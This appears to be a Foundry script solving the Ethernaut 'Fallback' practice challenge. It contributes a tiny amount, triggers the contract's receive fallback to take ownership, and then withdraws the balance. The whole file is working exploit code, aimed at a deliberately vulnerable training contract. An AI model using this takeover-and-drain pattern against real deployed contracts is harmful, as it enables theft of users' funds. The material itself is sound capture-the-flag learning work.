// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Script} from "forge-std/Script.sol";
import "../challenges/1_Fallback.sol";

contract POC is Script {
    Fallback fall =
        Fallback(payable(0x28cF211dcAff31B4c90aA321E976311f7A09f9FA)); // Replace with your Fallback instance

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployer);

        fall.contribute{value: 1 wei}();
        (bool success, ) = address(fall).call{value: 1 wei}("");
        require(success, "Failed to send ether");
        fall.withdraw();

        vm.stopBroadcast();
    }
}
